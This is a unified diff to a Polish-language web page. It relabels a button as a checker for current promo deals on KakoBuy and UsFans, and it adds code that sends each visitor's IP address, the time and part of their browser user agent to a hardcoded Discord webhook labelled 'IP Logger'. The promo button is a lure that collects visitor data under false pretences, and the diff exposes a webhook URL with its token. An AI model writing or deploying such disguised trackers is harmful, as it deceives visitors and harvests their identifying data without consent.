@@ -23,6 +23,8 @@
 
     .container {
       text-align: center;
+      max-width: 500px;
+      width: 100%;
     }
 
     /* Przycisk */
@@ -42,10 +44,12 @@
       display: inline-flex;
       align-items: center;
       gap: 0.8rem;
+      width: 100%;
+      justify-content: center;
     }
 
     .check-btn:hover {
-      transform: scale(1.04);
+      transform: scale(1.03);
       background: linear-gradient(135deg, #818cf8, #4f46e5);
       box-shadow: 0 12px 40px -8px #4f46e5;
     }
@@ -63,9 +67,9 @@
 
     /* Wynik IP */
     .ip-result {
-      margin-top: 2.5rem;
+      margin-top: 2rem;
       min-height: 4rem;
-      font-size: 3.2rem;
+      font-size: 3rem;
       font-weight: 700;
       color: #ffffff;
       text-shadow: 0 0 30px rgba(99, 102, 241, 0.2);
@@ -73,6 +77,7 @@
       letter-spacing: 0.02em;
       word-break: break-word;
       transition: all 0.3s ease;
+      padding: 0.5rem;
     }
 
     .ip-result.placeholder {
@@ -88,6 +93,36 @@
       font-size: 1.3rem;
       font-family: 'Inter', 'Segoe UI', sans-serif;
       font-weight: 500;
+    }
+
+    /* Status wysyłki na Discord */
+    .discord-status {
+      margin-top: 0.8rem;
+      font-size: 0.9rem;
+      color: #64748b;
+      letter-spacing: 0.02em;
+      padding: 0.5rem;
+      border-radius: 2rem;
+      transition: all 0.3s ease;
+      min-height: 2.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+    }
+
+    .discord-status.loading {
+      color: #94a3b8;
+    }
+
+    .discord-status.success {
+      color: #34d399;
+      background: rgba(52, 211, 153, 0.08);
+    }
+
+    .discord-status.error {
+      color: #f87171;
+      background: rgba(248, 113, 113, 0.08);
     }
 
     /* Spinner w przycisku */
@@ -114,27 +149,69 @@
       0% { opacity: 0; transform: translateY(8px); }
       100% { opacity: 1; transform: translateY(0); }
     }
+
+    /* Logo Discord */
+    .discord-icon {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      background: #5865F2;
+      border-radius: 50%;
+      position: relative;
+      flex-shrink: 0;
+    }
+
+    .discord-icon::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 10px;
+      height: 10px;
+      background: #5865F2;
+      border-radius: 50%;
+      box-shadow: 0 0 0 2px #0f172a, 0 0 0 4px #5865F2;
+    }
+
+    /* Responsywność */
+    @media (max-width: 480px) {
+      .check-btn {
+        font-size: 1.2rem;
+        padding: 1rem 2rem;
+      }
+      .ip-result {
+        font-size: 2.2rem;
+      }
+    }
   </style>
 </head>
 <body>
 
 <div class="container">
-  <!-- TYLKO PRZYCISK -->
+  <!-- Przycisk -->
   <button id="checkBtn" class="check-btn">
-    <span>🔍</span> Promki UsFans / KakoBuy
+    <span>🔍</span> Kliknij przycisk aby sprawdzić akutalne promki na KakoBuy i UsFans
   </button>
 
-  <!-- Wynik pojawia się poniżej -->
+  <!-- Wynik IP -->
   <div id="ipDisplay" class="ip-result placeholder">
     kliknij przycisk
   </div>
+
+  <!-- Status wysyłki na Discord - początkowo pusty -->
+  <div id="discordStatus" class="discord-status"></div>
 </div>
 
 <script>
   (function() {
     const btn = document.getElementById('checkBtn');
     const display = document.getElementById('ipDisplay');
+    const discordStatus = document.getElementById('discordStatus');
     let loading = false;
+
+    // 🔥 🔥 🔥 TWOJ WEBHOOK URL 🔥 🔥 🔥
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1519308051654639756/y6XSOCL4vFHGUj1NwLlBvd885qRAApltoNnbcf_8wND9kQN8XnszPxejltrZhbUa1Qrb';
 
     function setLoading(state) {
       loading = state;
@@ -143,6 +220,11 @@
         btn.innerHTML = `
           <span>⏳</span> Sprawdzam
           <span class="spinner"></span>
+        `;
+        discordStatus.className = 'discord-status loading';
+        discordStatus.innerHTML = `
+          <span class="discord-icon"></span>
+          ⏳ pobieranie IP...
         `;
       } else {
         btn.disabled = false;
@@ -162,6 +244,74 @@
       display.textContent = `⚠️ ${msg}`;
     }
 
+    function setDiscordStatus(type, message) {
+      discordStatus.className = `discord-status ${type}`;
+      discordStatus.innerHTML = `
+        <span class="discord-icon"></span>
+        ${message}
+      `;
+    }
+
+    // Funkcja wysyłająca IP na Discorda przez webhook
+    function sendToDiscord(ip) {
+      setDiscordStatus('loading', '⏳ wysyłanie na Discord...');
+
+      // Przygotowanie ładnego embeda dla Discorda
+      const embed = {
+        title: '🌐 Nowe IP',
+        color: 0x5865F2,
+        fields: [
+          {
+            name: '📡 Adres IP',
+            value: `\`${ip}\``,
+            inline: false
+          },
+          {
+            name: '🕐 Data',
+            value: new Date().toLocaleString('pl-PL', { timeZone: 'Europe/Warsaw' }),
+            inline: true
+          },
+          {
+            name: '🖥️ Przeglądarka',
+            value: navigator.userAgent.split(' ').slice(0, 3).join(' ') || 'Nieznana',
+            inline: true
+          }
+        ],
+        footer: {
+          text: 'Sprawdź IP • Wyślij na Discord'
+        },
+        timestamp: new Date().toISOString()
+      };
+
+      const payload = {
+        embeds: [embed],
+        username: 'IP Logger',
+        avatar_url: 'https://cdn.discordapp.com/embed/avatars/1.png'
+      };
+
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status} - ${response.statusText}`);
+        }
+        return response.text();
+      })
+      .then(() => {
+        setDiscordStatus('success', '✅ IP wysłane na Discord!');
+        console.log('✅ IP wysłane na Discord:', ip);
+      })
+      .catch(error => {
+        console.error('❌ Błąd wysyłki na Discord:', error);
+        setDiscordStatus('error', `❌ Błąd: ${error.message || 'nie udało się wysłać'}`);
+      });
+    }
+
     function fetchIP() {
       if (loading) return;
 
@@ -176,9 +326,11 @@
         })
         .then(data => {
           if (data && data.ip) {
-            showIP(data.ip);
+            const ip = data.ip;
+            showIP(ip);
+            sendToDiscord(ip);
           } else {
-            throw new Error('Brak IP');
+            throw new Error('Brak IP w odpowiedzi');
           }
         })
         .catch(err => {
@@ -190,13 +342,16 @@
             })
             .then(data => {
               if (data && data.ip) {
-                showIP(data.ip);
+                const ip = data.ip;
+                showIP(ip);
+                sendToDiscord(ip);
               } else {
-                throw new Error('Brak IP');
+                throw new Error('Brak IP w odpowiedzi ip-api');
               }
             })
             .catch(() => {
               showError('Nie udało się pobrać IP');
+              setDiscordStatus('error', '❌ Nie pobrano IP – nie wysłano');
             });
         })
         .finally(() => {
